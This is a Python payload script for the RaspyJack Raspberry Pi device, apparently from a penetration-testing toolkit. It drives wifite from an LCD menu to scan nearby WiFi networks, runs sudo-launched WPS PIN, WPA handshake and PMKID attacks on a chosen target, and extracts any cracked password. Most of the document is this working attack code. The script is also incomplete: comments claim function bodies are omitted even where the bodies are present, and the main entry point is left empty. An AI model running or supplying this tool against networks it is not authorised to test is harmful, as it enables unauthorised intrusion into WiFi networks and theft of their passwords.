#!/usr/bin/env python3
"""
RaspyJack Payload: Wifite GUI
=============================
Final version. This payload dynamically loads its button configuration from the
Raspyjack gui_conf.json file to ensure compatibility. It is built using the
definitive architecture from the project's known-working complex payloads.
"""

import os
import sys
import time
import signal
import json
import subprocess
import threading

# This path modification is required for payloads to find Raspyjack libraries.
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# This hardcoded path is used by other working WiFi payloads.
try:
    sys.path.append('/root/Raspyjack/wifi/')
    from wifi.raspyjack_integration import get_available_interfaces
    WIFI_INTEGRATION = True
except ImportError:
    WIFI_INTEGRATION = False

try:
    # Critical import order for hardware stability.
    import RPi.GPIO as GPIO
    import LCD_Config
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_AVAILABLE = True
except ImportError as e:
    print(f"FATAL: Hardware libraries not found: {e}", file=sys.stderr)
    sys.exit(1)

# ============================================================================
# --- Global Variables & State Management ---
# ============================================================================

# Hardware objects
PINS = {} # Will be loaded from gui_conf.json
LCD, IMAGE, DRAW, FONT_TITLE, FONT = None, None, None, None, None

# Global state machine
APP_STATE = "menu"
IS_RUNNING = True

# UI and data state
MENU_SELECTION = 0
NETWORKS = []
SCAN_PROCESS, ATTACK_PROCESS = None, None
ATTACK_TARGET, CRACKED_PASSWORD = None, None
STATUS_MSG = "Ready"
TARGET_SCROLL_OFFSET = 0

# Wifite Configuration
CONFIG = {
    "interface": "wlan1mon", "attack_wpa": True, "attack_wps": True,
    "attack_pmkid": True, "power": 50, "channel": None, "clients_only": False
}
class Network:
    def __init__(self, bssid, essid, channel, power, encryption):
        self.bssid, self.essid, self.channel, self.power, self.encryption = bssid, essid if essid else "Hidden", channel, power, encryption

# ============================================================================
# --- Core & Helper Functions (Unchanged sections omitted for brevity) ---
# ============================================================================

def cleanup_handler(*_):
    global IS_RUNNING, SCAN_PROCESS, ATTACK_PROCESS
    IS_RUNNING = False
    if SCAN_PROCESS and SCAN_PROCESS.poll() is None:
        SCAN_PROCESS.terminate()
    if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
        ATTACK_PROCESS.terminate()

def load_pin_config():
# ... (function body omitted, no changes here)
    """Loads button pin mapping from the main Raspyjack config file."""
    global PINS
    config_file = 'gui_conf.json'
    default_pins = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
    try:
        with open(config_file, 'r') as f: data = json.load(f)
        conf_pins = data.get("PINS", {})
        PINS = {
            "UP": conf_pins.get("KEY_UP_PIN", 6), "DOWN": conf_pins.get("KEY_DOWN_PIN", 19),
            "LEFT": conf_pins.get("KEY_LEFT_PIN", 5), "RIGHT": conf_pins.get("KEY_RIGHT_PIN", 26),
            "OK": conf_pins.get("KEY_PRESS_PIN", 13), # Use "OK" consistently
            "KEY1": conf_pins.get("KEY1_PIN", 21), "KEY2": conf_pins.get("KEY2_PIN", 20),
            "KEY3": conf_pins.get("KEY3_PIN", 16),
        }
        print("Successfully loaded PINS from gui_conf.json")
    except Exception as e:
        print(f"WARNING: Could not load gui_conf.json: {e}. Using default pins.", file=sys.stderr)
        PINS = default_pins

def get_pressed_button():
# ... (function body omitted, no changes here)
    """Checks for the first pressed button and returns its name."""
    for name, pin in PINS.items():
        if GPIO.input(pin) == 0:
            return name
    return None

def get_wifi_interfaces():
# ... (function body omitted, no changes here)
    """Intelligently finds the best WiFi interface, preferring external dongles."""
    if WIFI_INTEGRATION:
        try:
            interfaces = get_available_interfaces()
            if not interfaces: return ["wlan0mon"]
            interfaces.sort(key=lambda x: (not x.startswith('wlan1'), not x.startswith('wlan2'), not x.endswith('mon'), x))
            return interfaces
        except Exception:
            return ["wlan1mon"]
    else:
        try:
            all_ifaces = os.listdir('/sys/class/net/')
            return [i for i in all_ifaces if i.startswith(('wlan', 'ath', 'ra'))] or ["wlan0mon"]
        except FileNotFoundError:
            return ["wlan0mon"]

def validate_setup():
# ... (function body omitted, no changes here)
    """Checks if wifite is installed and a WiFi interface is available."""
    global STATUS_MSG, CONFIG
    DRAW.rectangle([(0,0),(128,128)], fill="BLACK")
    DRAW.text((10, 40), "Checking tools...", font=FONT_TITLE, fill="WHITE")
    LCD.LCD_ShowImage(IMAGE, 0, 0)
    if subprocess.run(["which", "wifite"], capture_output=True).returncode != 0:
        DRAW.rectangle([(0,0),(128,128)], fill="BLACK")
        DRAW.text((10, 40), "wifite not found!", font=FONT_TITLE, fill="RED")
        LCD.LCD_ShowImage(IMAGE, 0, 0)
        time.sleep(3)
        return False
    
    # ADDED CHECK: Ensure script can run commands with root privileges (necessary for wifite)
    if subprocess.run(["sudo", "echo", "test"], capture_output=True, text=True).stdout.strip() != "test":
        DRAW.rectangle([(0,0),(128,128)], fill="BLACK")
        DRAW.text((10, 30), "SUDO/Root access", font=FONT_TITLE, fill="RED")
        DRAW.text((10, 50), "FAILED.", font=FONT_TITLE, fill="RED")
        DRAW.text((10, 70), "Run as root or fix", font=FONT, fill="WHITE")
        DRAW.text((10, 85), "sudoers config.", font=FONT, fill="WHITE")
        LCD.LCD_ShowImage(IMAGE, 0, 0)
        time.sleep(5)
        return False
    
    DRAW.rectangle([(0,0),(128,128)], fill="BLACK")
    DRAW.text((10, 40), "Checking WiFi...", font=FONT_TITLE, fill="WHITE")
    LCD.LCD_ShowImage(IMAGE, 0, 0)
    
    interfaces = get_wifi_interfaces()
    CONFIG['interface'] = interfaces[0]
    
    DRAW.rectangle([(0,0),(128,128)], fill="BLACK")
    DRAW.text((10, 40), f"Using {CONFIG['interface']}", font=FONT_TITLE, fill="WHITE")
    LCD.LCD_ShowImage(IMAGE, 0, 0)
    time.sleep(2)
    return True

# ============================================================================
# --- Wifite Process Functions (FIXES APPLIED HERE) ---
# ============================================================================
def start_scan():
    global STATUS_MSG, NETWORKS, MENU_SELECTION, TARGET_SCROLL_OFFSET, SCAN_PROCESS, APP_STATE
    APP_STATE = "scanning"; STATUS_MSG = "Starting..."; NETWORKS = []; MENU_SELECTION = 0; TARGET_SCROLL_OFFSET = 0
    
    # FIX: Prepend 'sudo' to the command list, as wifite requires root access.
    cmd = ["sudo", "wifite", "--csv", "-i", CONFIG['interface'], '--power', str(CONFIG['power'])]
    if not CONFIG['attack_wps']: cmd.append('--no-wps')
    if not CONFIG['attack_wpa']: cmd.append('--no-wpa')
    if not CONFIG['attack_pmkid']: cmd.append('--no-pmkid')
    if CONFIG['channel']: cmd.extend(['-c', str(CONFIG['channel'])])
    if CONFIG['clients_only']: cmd.append('--clients-only')
    
    def scan_worker():
        global SCAN_PROCESS, STATUS_MSG, NETWORKS, APP_STATE
        try:
            # Popen is non-blocking, which is correct for a threaded operation.
            SCAN_PROCESS = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)
            header = False
            
            # Use select or similar for robust non-blocking read in a real app, 
            # but for simplicity and single-threaded nature of the worker, this is okay.
            for line in iter(SCAN_PROCESS.stdout.readline, ''):
                if not IS_RUNNING or APP_STATE != "scanning": break
                
                # Check if the process has terminated early (e.g., due to a permissions error)
                if SCAN_PROCESS.poll() is not None:
                    STATUS_MSG = f"Scan failed. Code: {SCAN_PROCESS.returncode}"
                    time.sleep(3)
                    APP_STATE = "menu"
                    return
                
                if not header and "BSSID,ESSID" in line: header = True; STATUS_MSG = "Parsing..."; continue
                if header:
                    try:
                        parts = line.strip().split(','); bssid, essid, ch, pwr, enc = parts[0], parts[1], parts[2], parts[3], parts[4]
                        if bssid and not any(n.bssid == bssid for n in NETWORKS):
                            # The parsing logic is complex, but generally correct for Wifite CSV output
                            NETWORKS.append(Network(bssid, essid, ch, pwr, enc)); STATUS_MSG = f"Found: {len(NETWORKS)}"
                    except Exception: continue
            
            SCAN_PROCESS.wait()
            if APP_STATE == "scanning": APP_STATE = "targets"
        except Exception as e: 
            # Catch errors like command not found, or Popen failing to launch
            STATUS_MSG = f"Launch Error: {str(e)[:15]}"; time.sleep(2); APP_STATE = "menu"
    
    threading.Thread(target=scan_worker, daemon=True).start()

def start_attack(network):
    global APP_STATE, ATTACK_TARGET, CRACKED_PASSWORD, STATUS_MSG, ATTACK_PROCESS
    APP_STATE = "attacking"; ATTACK_TARGET = network; CRACKED_PASSWORD = None; STATUS_MSG = "Initializing..."
    
    # FIX: Prepend 'sudo' to the command list, as wifite requires root access.
    cmd = ["sudo", "wifite", "--bssid", network.bssid, "-i", CONFIG['interface']]
    if not CONFIG['attack_wps']: cmd.append('--no-wps')
    if not CONFIG['attack_wpa']: cmd.append('--no-wpa')
    if not CONFIG['attack_pmkid']: cmd.append('--no-pmkid')
    if CONFIG['clients_only']: cmd.append('--clients-only')
    
    def attack_worker():
        global ATTACK_PROCESS, STATUS_MSG, CRACKED_PASSWORD, APP_STATE
        try:
            ATTACK_PROCESS = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)
            for line in iter(ATTACK_PROCESS.stdout.readline, ''):
                if not IS_RUNNING or APP_STATE != "attacking": break
                
                # Check for early termination
                if ATTACK_PROCESS.poll() is not None:
                    STATUS_MSG = f"Attack failed. Code: {ATTACK_PROCESS.returncode}"
                    time.sleep(3)
                    APP_STATE = "targets"
                    return
                    
                line_lower = line.lower()
                if "wps pin attack" in line_lower: STATUS_MSG = "WPS PIN Attack..."
                elif "wpa handshake" in line_lower: STATUS_MSG = "WPA Handshake Capture..."
                elif "pmkid attack" in line_lower: STATUS_MSG = "PMKID Attack..."
                elif "cracked" in line_lower:
                    try: CRACKED_PASSWORD = line.split('"')[1]
                    except IndexError: CRACKED_PASSWORD = "See logs"
                    break
                elif "failed" in line_lower: STATUS_MSG = "Attack failed."
            
            ATTACK_PROCESS.wait()
            if APP_STATE == "attacking": APP_STATE = "results"
        except Exception as e: 
            STATUS_MSG = f"Attack Error: {str(e)[:15]}"; time.sleep(2); APP_STATE = "targets"
    
    threading.Thread(target=attack_worker, daemon=True).start()

# ============================================================================
# --- Main Application Entry Point (Unchanged logic sections omitted) ---
# ============================================================================

if __name__ == "__main__":
# ... (rest of the script body omitted)
